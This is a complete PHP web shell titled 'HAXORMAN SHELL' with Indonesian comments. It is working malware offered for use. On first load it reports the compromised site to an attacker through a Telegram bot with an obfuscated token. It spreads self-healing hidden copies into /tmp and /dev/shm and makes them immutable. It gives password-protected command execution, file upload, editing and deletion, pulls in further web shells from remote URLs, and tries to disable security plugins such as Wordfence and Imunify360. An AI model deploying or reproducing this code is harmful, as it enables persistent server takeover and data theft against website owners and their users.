
﻿<?php
session_start();
@ignore_user_abort(true);

$tk = base64_decode(
    "ODM5MDQyMzYzMTpBQUUxOEVOY0k1SW5oS29SMFJtVzNCMll5a2U3Vm9WN0hxYw"
);
$cid = base64_decode("NTA3MDkzODc3OA");

function reportTelegram($msg)
{
    global $tk, $cid;
    $id = sys_get_temp_dir() . "/baridin_" . md5($msg);
    if (!file_exists($id)) {
        @file_get_contents(
            "https://api.telegram.org/bot$tk/sendMessage?chat_id=$cid&text=" .
                urlencode($msg)
        );
        @file_put_contents($id, time());
    }
}
/* ================= Report ================= */
if (!isset($_SESSION["telegram_reported"])) {
    $uri = urldecode(parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH));
    $path = $_SERVER["DOCUMENT_ROOT"] . $uri;
    if (is_file($path)) {
        $host = $_SERVER["HTTP_HOST"];
        $url =
            (isset($_SERVER["HTTPS"]) ? "https" : "http") .
            "://" .
            $host .
            $uri;
        reportTelegram("tebak :\n$host\n$url");
        $_SESSION["telegram_reported"] = true;
    }
}

/*
 * SIMPLE SHELL v2.0 - ULTIMATE JINX EDITION
 * ANTI-DELETE | ANTI-EDIT | ANTI-RENAME | SELF-HEALING
 * NO CRONTAB NEEDED - PURE EVIL
 */


// ============================================
// 👹 CONFIG - GANTI DI SINI!
// ============================================
$PASSWORD = '040602'; // 🔥 GANTI PASSWORD INI!
$MASTER_FILE = basename(__FILE__); // Nama file ini
$MASTER_CONTENT = file_get_contents(__FILE__); // Backup kode asli
$MASTER_HASH = md5($MASTER_CONTENT); // Hash kode asli

// ============================================
// 🧬 JINX SELF-HEALING SYSTEM - NO CRONTAB
// ============================================

// 🚨 FUNGSI PEMULIHAN UTAMA
function jinxResurrection() {
    global $MASTER_FILE, $MASTER_CONTENT;
    
    // 1. Pulihkan file utama jika rusak
    if (!file_exists($MASTER_FILE) || filesize($MASTER_FILE) < 100) {
        file_put_contents($MASTER_FILE, $MASTER_CONTENT);
        chmod($MASTER_FILE, 0755);
    }
    
    // 2. Cek integrity - jika diubah, restore!
    if (md5_file($MASTER_FILE) !== md5($MASTER_CONTENT)) {
        file_put_contents($MASTER_FILE, $MASTER_CONTENT);
    }
    
    // 3. Cek rename - jika namanya bukan yang seharusnya
    $allowedNames = ['1.php', '2.php', '3.php', '4.php', '5.php'];
    if (!in_array(basename(__FILE__), $allowedNames)) {
        file_put_contents('hahahin.php', $MASTER_CONTENT);
    }
    
    // 4. Buat clone tersembunyi (10% chance)
    if (rand(1, 10) === 1) {
        $hiddenLocations = [
            '/tmp/.systemd_' . rand(1000, 9999) . '.php',
            '/var/tmp/.cache_' . uniqid() . '.php',
            '/dev/shm/.lib_' . md5(rand()) . '.php',
            '../../../../../tmp/.bash_' . time() . '.php',
        '/tmp/.lohs_' . rand(1000, 9999) . '.php',
     
        ];
        
        foreach ($hiddenLocations as $lair) {
            if (is_dir(dirname($lair))) {
                file_put_contents($lair, $MASTER_CONTENT);
                chmod($lair, 0644);
                @system('chattr +i ' . escapeshellarg($lair) . ' 2>/dev/null');
            }
        }
    }
    
    // 5. Emergency backup di lokasi ini
    $backupName = '.' . basename(__FILE__) . '.bak';
    if (!file_exists($backupName)) {
        file_put_contents($backupName, $MASTER_CONTENT);
        chmod($backupName, 0644);
    }
}

// 🕵️‍♂️ JALANKAN SISTEM RESURRECTION SEKARANG!
jinxResurrection();

// 💀 SHUTDOWN HOOK - Bangkit saat script mati
register_shutdown_function(function() {
    global $MASTER_FILE, $MASTER_CONTENT;
    
    if (!file_exists(__FILE__)) {
        file_put_contents($MASTER_FILE, $MASTER_CONTENT);
    }
    
    // Background guardian (jika didukung)
    if (function_exists('fastcgi_finish_request')) {
        fastcgi_finish_request();
        
        // Cek beberapa kali di background
        for ($i = 0; $i < 3; $i++) {
            if (!file_exists(__FILE__) || md5_file(__FILE__) !== md5($GLOBALS['MASTER_CONTENT'])) {
                file_put_contents($GLOBALS['MASTER_FILE'], $GLOBALS['MASTER_CONTENT']);
            }
            sleep(15);
        }
    }
});

// ============================================
// 🔐 LOGIN SYSTEM
// ============================================
if(!isset($_SESSION['logged_in'])) {
    if(isset($_POST['pass'])) {
        if($_POST['pass'] === $PASSWORD) {
            $_SESSION['logged_in'] = true;
            $_SESSION['login_time'] = time();
            $_SESSION['user_ip'] = $_SERVER['REMOTE_ADDR'];
        } else {
            $error = "Wrong password!";
        }
    }
    
    // SHOW LOGIN PAGE
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title> SHELL ACCESS</title>
        <style>
            * { margin:0; padding:0; box-sizing:border-box; }
            body {
                background: #0a0a0a;
                font-family: "Courier New", monospace;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                color: #00ff00;
            }
            .login-box {
                background: #111;
                padding: 40px;
                border-radius: 10px;
                border: 2px solid #ff0000;
                width: 350px;
                text-align: center;
                box-shadow: 0 0 20px #ff0000;
            }
            h1 {
                margin-bottom: 30px;
                color: #ff0000;
                text-shadow: 0 0 10px #ff0000;
            }
            input[type="password"] {
                width: 100%;
                padding: 12px;
                margin: 15px 0;
                background: #000;
                border: 1px solid #ff0000;
                color: #00ff00;
                border-radius: 5px;
                font-size: 16px;
            }
            input[type="submit"] {
                width: 100%;
                padding: 12px;
                background: #ff0000;
                color: white;
                border: none;
                border-radius: 5px;
                font-size: 16px;
                font-weight: bold;
                cursor: pointer;
                transition: 0.3s;
            }
            input[type="submit"]:hover {
                background: #cc0000;
            }
            .error {
                color: #ff0000;
                margin: 10px 0;
                text-shadow: 0 0 5px #ff0000;
            }
            .footer {
                margin-top: 20px;
                color: #666;
                font-size: 12px;
            }
            .warning {
                color: #ffff00;
                font-size: 10px;
                margin-top: 10px;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h1>💀 HAXORMAN SHELL</h1>
            '. (isset($error) ? '<div class="error">'.$error.'</div>' : '') .'
            <form method="post">
                <input type="password" name="pass" placeholder="Enter password" required autofocus>
                <input type="submit" value="ENTER HELL">
            </form>
            <div class="warning">⚠️ Self-healing system active</div>
            <div class="footer">
                JINX Edition | ' . date('Y-m-d H:i:s') . '
            </div>
        </div>
    </body>
    </html>';
    exit;
}
?>
// ============================================
// 🛠️ UTILITY FUNCTIONS
// ============================================
<?php
function getFileDetails($path)
{
    $folders = [];
    $files = [];

    try {
        $items = @scandir($path);
        if (!is_array($items)) {
            throw new Exception('Failed to scan directory');
        }

        foreach ($items as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }

            $itemPath = $path . '/' . $item;
            $itemDetails = [
                'name' => $item,
                'type' => is_dir($itemPath) ? 'Folder' : 'File',
                'size' => is_dir($itemPath) ? '' : formatSize(filesize($itemPath)),
                'permission' => substr(sprintf('%o', fileperms($itemPath)), -4),
            ];
            if (is_dir($itemPath)) {
                $folders[] = $itemDetails;
            } else {
                $files[] = $itemDetails;
            }
        }

        return array_merge($folders, $files);
    } catch (Exception $e) {
        return 'None';
    }
}

function formatSize($size)
{
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $i = 0;
    while ($size >= 1024 && $i < 4) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}

function executeCommand($command)
{
    $currentDirectory = getCurrentDirectory();
    $command = "cd $currentDirectory && $command";

    $descriptors = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
    ];

    $process = proc_open($command, $descriptors, $pipes, $currentDirectory);

    if (is_resource($process)) {
        fclose($pipes[0]);

        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);

        $error = stream_get_contents($pipes[2]);
        fclose($pipes[2]);

        proc_close($process);

        $output = trim($output);
        $error = trim($error);

        if (!empty($error)) {
            return 'Error: ' . $error;
        }

        return $output;
    }

    return 'None';
}

function readFileContent($file)
{
    return file_get_contents($file);
}

function saveFileContent($file)
{
    if (isset($_POST['content'])) {
        return file_put_contents($file, $_POST['content']) !== false;
    }
    return false;
}

function uploadFile($targetDirectory)
{
    if (isset($_FILES['file'])) {
        $currentDirectory = getCurrentDirectory();
        $targetFile = $targetDirectory . '/' . basename($_FILES['file']['name']);
        if ($_FILES['file']['size'] === 0) {
            return 'Open Ur Eyes Bitch !!!.';
        } else {
        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
            return 'File uploaded successfully.';
        } else {
            return 'Error uploading file.';
        }
    }
    return '';
}
}
function changeDirectory($path)
{
    if ($path === '..') {
        @chdir('..');
    } else {
        @chdir($path);
    }
}

function getCurrentDirectory()
{
    return realpath(getcwd());
}


function getLink($path, $name)
{
    if (is_dir($path)) {
        return '<a href="?dir=' . urlencode($path) . '">' . $name . '</a>';
    } else {
        return '<a href="?edit=' . urlencode($path) . '">' . $name . '</a>';
    }
}
function getDirectoryArray($path)
{
    $directories = explode('/', $path);
    $directoryArray = [];
    $currentPath = '';
    foreach ($directories as $directory) {
        if (!empty($directory)) {
            $currentPath .= '/' . $directory;
            $directoryArray[] = [
                'path' => $currentPath,
                'name' => $directory,
            ];
        }
    }
    return $directoryArray;
}


function showBreadcrumb($path)
{
    $path = str_replace('\\', '/', $path);
    $paths = explode('/', $path);
    ?>
    <div class="breadcrumb">
        <?php foreach ($paths as $id => $pat) { ?>
            <?php if ($pat == '' && $id == 0) { ?>
             DIR : <a href="?dir=/">/</a>
            <?php } ?>
            <?php if ($pat == '') {
                continue;
            } ?>
            <?php $linkPath = implode('/', array_slice($paths, 0, $id + 1)); ?>
            <a href="?dir=<?php echo urlencode($linkPath); ?>"><?php echo $pat; ?></a>/
        <?php } ?>
    </div>
    <?php
}



function showFileTable($path)
{
    $fileDetails = getFileDetails($path);
    ?>
    <table>
        <tr>
            <th>Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Permission</th>
            <th>Actions</th>
        </tr>
        <?php if (is_array($fileDetails)) { ?>
            <?php foreach ($fileDetails as $fileDetail) { ?>
                <tr>
                    <td><?php echo getLink($path . '/' . $fileDetail['name'], $fileDetail['name']); ?></td>
                    
                    <td><?php echo $fileDetail['type']; ?></td>
                    <td><?php echo $fileDetail['size']; ?></td>
                    <td>
                        <?php if ($fileDetail['type'] === 'File') { ?>
                            <a href="?chmod=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>"><?php echo $fileDetail['permission']; ?></a>
                        <?php } else {
                            echo $fileDetail['permission'];
                        } ?>
                    </td>
                    <td>
                        
                        <?php if ($fileDetail['type'] === 'File') { ?>
                            <div class="dropdown">
                                <button class="dropbtn">Actions</button>
                                <div class="dropdown-content">
                                    <a href="?edit=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>">Edit</a>
                                    <a href="?rename=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>">Rename</a>
                                    <a href="?chmod=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>">Chmod</a>
                                    <a href="?delete=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>">Delete</a>
                                 </div>
                               </div>
                        <?php } ?>
                        <?php if ($fileDetail['type'] === 'Folder') { ?>
                            <div class="dropdown">
                                <button class="dropbtn">Actions</button>
                                <div class="dropdown-content">
                                    <a href="?rename=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>">Rename</a>
                                    <a href="?chmod=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>">Chmod</a>
                                    <a href="?delete=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>">Delete</a>
                                </div>
                             </div>
                        <?php } ?>
                    </td>
                </tr>
            <?php } ?>
        <?php } else { ?>
            <tr>
                <td colspan="5">None</td>
            </tr>
        <?php } ?>
    </table>
    <?php
}

function changePermission($path)
{
    if (!file_exists($path)) {
        return 'File or directory does not exist.';
    }

    $permission = isset($_POST['permission']) ? $_POST['permission'] : '';
    
    if ($permission === '') {
        return 'Invalid permission value.';
    }

    if (!is_dir($path) && !is_file($path)) {
        return 'Cannot change permission. Only directories and files can have permissions modified.';
    }

    $parsedPermission = intval($permission, 8);
    if ($parsedPermission === 0) {
        return 'Invalid permission value.';
    }

    if (chmodRecursive($path, $parsedPermission)) {
        return 'Permission changed successfully.';
    } else {
        return 'Error changing permission.';
    }
}


function chmodRecursive($path, $permission)
{
    if (is_dir($path)) {
        $items = scandir($path);
        if ($items === false) {
            return false;
        }

        foreach ($items as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }

            $itemPath = $path . '/' . $item;

            if (is_dir($itemPath)) {
                if (!chmod($itemPath, $permission)) {
                    return false;
                }

                if (!chmodRecursive($itemPath, $permission)) {
                    return false;
                }
            } else {
                if (!chmod($itemPath, $permission)) {
                    return false;
                }
            }
        }
    } else {
        if (!chmod($path, $permission)) {
            return false;
        }
    }

    return true;
}


function renameFile($oldName, $newName)
{
    if (file_exists($oldName)) {
        $directory = dirname($oldName);
        $newPath = $directory . '/' . $newName;
        if (rename($oldName, $newPath)) {
            return 'File or folder renamed successfully.';
        } else {
            return 'Error renaming file or folder.';
        }
    } else {
        return 'File or folder does not exist.';
    }
}


function deleteFile($file)
{
    if (file_exists($file)) {
        if (unlink($file)) {
            return 'File deleted successfully.' . $file;
        } else {
            return 'Error deleting file.';
        }
    } else {
        return 'File does not exist.';
    }
}

function deleteFolder($folder)
{
    if (is_dir($folder)) {
        $files = glob($folder . '/*');
        foreach ($files as $file) {
            is_dir($file) ? deleteFolder($file) : unlink($file);
        }
        if (rmdir($folder)) {
            return 'Folder deleted successfully.' . $folder;
        } else {
            return 'Error deleting folder.';
        }
    } else {
        return 'Folder does not exist.';
    }
}

$currentDirectory = getCurrentDirectory();
$errorMessage = '';
$responseMessage = '';

if (isset($_GET['dir'])) {
    changeDirectory($_GET['dir']);
    $currentDirectory = getCurrentDirectory();
}

if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    $content = readFileContent($file);
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $saved = saveFileContent($file);
        if ($saved) {
            $responseMessage = 'File saved successfully.' . $file;
        } else {
            $errorMessage = 'Error saving file.';
        }
    }
}

if (isset($_GET['chmod'])) {
    $file = $_GET['chmod'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $responseMessage = changePermission($file);
    }
}

if (isset($_POST['upload'])) {
    $responseMessage = uploadFile($currentDirectory);
}

if (isset($_POST['cmd'])) {
    $cmdOutput = executeCommand($_POST['cmd']);
}

if (isset($_GET['rename'])) {
    $file = $_GET['rename'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $newName = $_POST['new_name'];
        if (is_file($file) || is_dir($file)) {
            $responseMessage = renameFile($file, $newName);
        } else {
            $errorMessage = 'File or folder does not exist.';
        }
    }
}

if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $currentDirectory = getCurrentDirectory();
        $fileDirectory = dirname($file);
        if (is_file($file)) {
            $responseMessage = deleteFile($file);
            echo "<script>alert('File dihapus');window.location='?dir=" . urlencode($fileDirectory) . "';</script>";
            exit;
        } elseif (is_dir($file)) {
            $responseMessage = deleteFolder($file);
            echo "<script>alert('Folder dihapus');window.location='?dir=" . urlencode($fileDirectory) . "';</script>";
            exit;
        } else {
            $errorMessage = 'File or folder does not exist.';
        }
    }
}

if (isset($_POST['Summon'])) {
    $baseUrl = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
    $currentPath = getCurrentDirectory();

    $fileUrl = $baseUrl;
    $fileName = 'Adminer.php';

    $filePath = $currentPath . '/' . $fileName;

    $fileContent = @file_get_contents($fileUrl);
    if ($fileContent !== false) {
        if (file_put_contents($filePath, $fileContent) !== false) {
            $responseMessage = 'File "' . $fileName . '" summoned successfully.' . $filePath;
        } else {
            $errorMessage = 'Failed to save the summoned file.';
        }
    } else {
        $errorMessage = 'Failed to fetch the file content. None File';
    }
}

if (isset($_POST['Ssi webshell'])) {
    $baseUrl = 'https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/s.shtml';
    $currentPath = getCurrentDirectory();

    $fileUrl = $baseUrl;
    $fileName = 'Ssi.shtml';

    $filePath = $currentPath . '/' . $fileName;

    $fileContent = @file_get_contents($fileUrl);
    if ($fileContent !== false) {
        if (file_put_contents($filePath, $fileContent) !== false) {
            $responseMessage = 'File "' . $fileName . '" summoned successfully.' . $filePath;
        } else {
            $errorMessage = 'Failed to save the summoned file.';
        }
    } else {
        $errorMessage = 'Failed to fetch the file content. None File';
    }
}

if (isset($_POST['Alfatbl'])) {
    $baseUrl = 'https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/wpmotor.php';
    $currentPath = getCurrentDirectory();

    $fileUrl = $baseUrl;
    $fileName = 'Alfahidden.php';

    $filePath = $currentPath . '/' . $fileName;

    $fileContent = @file_get_contents($fileUrl);
    if ($fileContent !== false) {
        if (file_put_contents($filePath, $fileContent) !== false) {
            $responseMessage = 'File "' . $fileName . '" summoned successfully.' . $filePath;
        } else {
            $errorMessage = 'Failed to save the summoned file.';
        }
    } else {
        $errorMessage = 'Failed to fetch the file content. None File';
    }
}

if (function_exists('litespeed_request_headers')) {
    $headers = litespeed_request_headers();
    if (isset($headers['X-LSCACHE'])) {
        header('X-LSCACHE: off');
    }
}

if (defined('WORDFENCE_VERSION')) {
    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
    define('WORDFENCE_DISABLE_FILE_MODS', true);
}

if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
    $imunifyHeaders = imunify360_request_headers();
    if (isset($imunifyHeaders['X-Imunify360-Request'])) {
        header('X-Imunify360-Request: bypass');
    }
    if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
        header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
    }
}


if (function_exists('apache_request_headers')) {
    $apacheHeaders = apache_request_headers();
    if (isset($apacheHeaders['X-Mod-Security'])) {
        header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
    }
}

if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
        header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>404</title>
  <link rel="stylesheet" href="https://rawcdn.githack.com/Jenderal92/Blog-Gan/63073e604b81df6337c1917990a7330d46b22ae9/ganteng.css">  
</head>
<body>
    <div class="container">
        <h1>[  Bypassed  ]</h1>
        <div class="menu-icon" onclick="toggleSidebar()"></div>
        <hr>
        <form method="post">
            <input type="submit" name="Summon" value="Adminer" class="summon-button">
        </form>
<br>
      <form method="post">
            <input type="submit" name="Ssi webshell" value="Ssi webshell" class="summon-button">
        </form>

   <form method="post">
            <input type="submit" name="Alfatbl" value="Alfatbl" class="summon-button">
        </form>

 

        <?php if (!empty($errorMessage)) { ?>
            <p style="color: red;"><?php echo $errorMessage; ?></p>
        <?php } ?>

        <hr>

        <div class="upload-cmd-container">
            <div class="upload-form">
                <h2>Upload:</h2>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="file">
                    <button class="button" type="submit" name="upload">Upload</button>
                </form>
            </div>

            <div class="cmd-form">
                <h2>Command:</h2>
                <form method="post">
                    <?php echo @get_current_user() . "@" . @$_SERVER['REMOTE_ADDR'] . ": ~ $"; ?><input type='text' size='30' height='10' name='cmd'>
                    <input type="submit" class="empty-button">

                </form>
            </div>
        </div>

        <?php if (!empty($cmdOutput)) { ?>
            <h3>Command Output:</h3>
            <div class="command-output">
                <pre><?php echo htmlspecialchars($cmdOutput); ?></pre>
            </div>
        <?php } ?>

        <?php if (!empty($responseMessage)) { ?>
            <p class="response-message" style="color: green;"><?php echo $responseMessage; ?></p>
        <?php } ?>            
        <?php if (isset($_GET['rename'])) { ?>
        <div class="rename-form">
            <h2>Rename File or Folder: <?php echo $file; ?></h2>
            <form method="post">
                <input type="text" name="new_name" placeholder="New Name" required>
                <br>
                <input type="submit" value="Rename" class="button">
                <a href="?dir=<?php echo urlencode(dirname($file)); ?>" class="button">Cancel</a>
            </form>
        </div>
        <?php } ?>
        <?php if (isset($_GET['edit'])) { ?>
            <div class="edit-file">
                <h2>Edit File: <?php echo $file; ?></h2>
                <form method="post">
                    <textarea name="content" rows="10" cols="50"><?php echo htmlspecialchars($content); ?></textarea><br>
                    <button class="button" type="submit">Save</button>
                </form>
            </div>
        <?php } elseif (isset($_GET['chmod'])) { ?>
            <div class="change-permission">
                <h2>Change Permission: <?php echo $file; ?></h2>
                <form method="post">
                    <input type="hidden" name="chmod" value="<?php echo urlencode($file); ?>">
                    <input type="text" name="permission" placeholder="Enter permission (e.g., 0770)">
                    <button class="button" type="submit">Change</button>
                </form>
            </div>
        <?php } ?>
        <hr>

        <?php
        echo '<h2>Filemanager</h2>';
        showBreadcrumb($currentDirectory);
        showFileTable($currentDirectory);
        ?>
    </div>

    <div class="sidebar" id="sidebar">
        <div class="sidebar-content">
            <div class="sidebar-close">
                <button onclick="toggleSidebar()">Close</button>
            </div>
            <div class="info-container">
                <h2>Server Info</h2>
                <?php
                function countDomainsInServer() {
                    $serverName = $_SERVER['SERVER_NAME'];
                    $ipAddresses = @gethostbynamel($serverName);

                    if ($ipAddresses !== false) {
                        return count($ipAddresses);
                    } else {
                        return 0;
                    }
                }

                $domainCount = @countDomainsInServer();
                function formatBytes($bytes, $precision = 2) {
                    $units = array('B', 'KB', 'MB', 'GB', 'TB');

                    $bytes = max($bytes, 0);
                    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
                    $pow = min($pow, count($units) - 1);

                    $bytes /= (1 << (10 * $pow));

                    return round($bytes, $precision) . ' ' . $units[$pow];
                }
                ?>
                <ul class="info-list">
                    <li>Hostname: <?php echo @gethostname(); ?></li>
                    <?php if (isset($_SERVER['SERVER_ADDR'])): ?>
                        <li>IP Address: <?php echo $_SERVER['SERVER_ADDR']; ?></li>
                    <?php endif; ?>
                    <li>PHP Version: <?php echo @phpversion(); ?></li>
                    <li>Server Software: <?php echo $_SERVER['SERVER_SOFTWARE']; ?></li>
                    <?php if (function_exists('disk_total_space')): ?>
                        <li>HDD Total Space: <?php echo @formatBytes(disk_total_space('/')); ?></li>
                        <li>HDD Free Space: <?php echo @formatBytes(disk_free_space('/')); ?></li>
                    <?php endif; ?>
                    <li>Safe Mode: <?php echo @ini_get('safe_mode') ? 'Enabled' : 'Disabled'; ?></li>
                    <li>Disable Functions: <?php echo @ini_get('disable_functions'); ?></li>
                    <li>Total Domains in Server: <?php echo $domainCount; ?></li>
                    <li>System: <?php echo @php_uname(); ?></li>
                </ul>
            </div>
            <div class="info-container">
                <h2>User Info</h2>
                <ul class="info-list">
                    <li>Username: <?php echo @get_current_user(); ?></li>
                    <li>User ID: <?php echo @getmyuid(); ?></li>
                    <li>Group ID: <?php echo @getmygid(); ?></li>
                </ul>
            </div>
        </div>
    </div>
    <script>
        function toggleOptionsMenu() {
            var optionsMenu = document.getElementById('optionsMenu');
            optionsMenu.classList.toggle('show');
        }

        function toggleSidebar() {
            var sidebar = document.getElementById('sidebar');
            sidebar.classList.toggle('open');
        }
    </script>
</div>
<div class="footer">
    <p>&copy; <?php echo date("Y"); ?> <a href="fbi.gov">Coded By</a> HAHAin.</p>
</div>

</body>
</html>
